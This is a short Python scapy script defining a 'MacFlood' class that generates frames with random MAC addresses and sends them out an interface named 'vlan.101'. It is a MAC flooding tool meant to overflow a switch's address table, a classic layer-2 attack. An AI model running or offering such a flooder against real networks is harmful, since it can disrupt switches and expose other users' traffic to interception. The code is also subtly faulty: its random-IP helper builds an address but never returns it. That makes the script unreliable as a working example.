import time
from scapy.all import *


class MacFlood:
    def __init__(self, iface, counts):
        self.iface = iface
        self.counts = counts

    def mac_random(self):
        mac = "02:00:00:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
        )
        return mac

    def ip_random(self):
        ip = "%s.%s.%s.%s" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
        )

    def packets(self):
        packet_list = []
        for i in range(1, self.counts):
            packet = Ether(src=self.mac_random(), dst=self.mac_random()) / IP(
                src=self.ip_random(), dst=self.ip_random()
            )
            packet_list.append(packet)
        self.packet_list = packet_list
        return self.packet_list

    def send(self):
        count = 0
        for packet in self.packet_list:
            count += 1
            print("Packet %s" % count)
            sendp(packet, iface=self.iface, verbose=False)
            time.sleep(0.05)
        print("Total sent %s packets" % count)


t = MacFlood("vlan.101", 100)
t.packets()
t.send()
